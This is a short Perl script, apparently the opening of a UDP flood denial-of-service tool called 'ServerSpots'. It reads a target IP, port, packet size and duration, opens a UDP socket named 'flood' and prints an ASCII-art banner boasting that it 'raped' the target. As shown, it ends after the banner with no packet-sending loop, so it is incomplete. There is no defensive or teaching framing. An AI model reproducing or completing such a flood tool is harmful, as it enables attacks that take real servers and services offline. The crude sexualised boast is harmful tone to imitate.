#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;


##
# ServerSpots
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print ORANGE<<EOTEXT;
	⣿⣷⣿⣿⣌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠻⠛⠉⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⣴⣾⣿⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀  ⠀⠀⠙⠛⢿⣿⣿⣿⣿⣿⡟⠀⠀⠀⢰⣿⣵⣿⣿⣿⣿⣇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠁⠀⠠⣚⡩⠘⠁⠀⣿⠿⠛⣿⣧⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠃⠀⢠⡞⠁⠀⠀⢀⣼⣿⡇⠀⠸⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⠏⠀⠀⢨⣷⣦⣤⢶⣫⣾⣿⡇⠀⠀⠹⣷⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⡏⠀⠀⠀⠀⠈⣿⣾⣋⣁⠀⢻⣿⣤⣀⣀⣽⡇⠀
⣀⠀⣄⣀⣀⠀⣹⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⠿⠿⣿⣿⣿⣝⡿⠿⠟⠁⠀
⣿⣇⣿⣿⡿⣹⣿⣿⣿⣿⣿⡧⠀⠀⠀⠀⠠⠳⠁⠀⠀⠀⢻⣿⣿⡟⠁⠀⠀⠀
⠿⢿⣿⣿⣷⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⣼⣿⡿⠀⠀⠀⠀⠀
⠀⠘⣿⣿⣿⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⣰⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

	@rxcuh raped $ip
	For $time Seconds
EOTEXT
